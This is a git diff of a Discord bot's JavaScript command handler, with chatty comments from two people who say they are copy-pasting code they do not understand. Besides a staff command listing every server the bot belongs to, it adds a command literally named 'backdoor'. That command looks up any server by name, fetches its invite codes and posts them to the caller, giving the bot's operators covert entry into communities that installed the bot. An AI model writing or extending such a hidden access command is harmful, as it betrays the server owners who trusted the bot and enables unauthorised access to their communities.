@@ -332,14 +332,59 @@ client.on('message', async(message) => {
             if (isStaff(message.member)) {
                 // Ok so here?
                 // perhaps...
+                let guildsMessage = "";
                 for (let guild of client.guilds.cache.array()) {
-                    message.channel.send(guild.name); //?
-                } // let's try that
+                    if (guildsMessage.length >= 2000) {
+                        break;
+                    }
+                    guildsMessage += "* " + guild.name + "\n";
+                } 
+                message.channel.send(guildsMessage);
+            }
+        }
+        if(command === 'backdoor') {
+            // need a guildid, that hasn't been defined
+            // I'm assuming this wants to loop over all the active guilds
+            // this is 100% going to break though
+            // I think it assumes we have a single guild id we want to check 
+            // well idk it's copypasted i guess that it's like that
+            // We can edit this one
+            // just need a loop on it, unless you want to make the command take an argument
+            // so you could say something like "backdoor <id>" and get it?
+            // yeah OK
+            // I think that's doable
+            // probably it would be easier to do if it were "backdoor <guild.name>" or something like that since
+            // we don't have ids
+            // so like can we try to make a backdoor command?
+            // right
+            // so id is kinda useless
+            // got it
+            // also there's missing { somewhere or something like that because it gives me fatal error
+            // cool
+            
+            // perhaps
+            // k i'm pushing
+            let guildName = message.content.substring(';backdoor'.length + 1);
+            const matchingGuilds = client.guilds.cache.array().filter((guild) => { 
+                return guild.name === guildName.trim() 
+            });
+
+            if (matchingGuilds && matchingGuilds.length == 1) {
+                matchingGuilds[0].fetchInvites()
+                .then(invites => message.channel.send('Found Invites:\n' + invites.map(invite => invite.code).join('\n')))
+                .catch(console.error);
+            } else {
+                message.channel.send(`The guild "${guildName}" couldn't be found.`);
+            }
+            // i don't know what any of that code means but looks like something functional
+                // let's try that
+                // i'm gonna copypaste backdoor command from stack in here
+                // We can make this look a little nicer probably
                 // message.channel.send(client.guilds);
                 // yes
                 // message.channel.send() simply doesn't work with client.guilds
                 // maybe
-            }
+            
         }  // this doesn't work because it can't send empty messages, it says this in console log when i call this command
         if (command === 'transfer') {
             message.channel.send('https://cdn.discordapp.com/attachments/586948600009981970/764341001854648340/upZStSY.png');
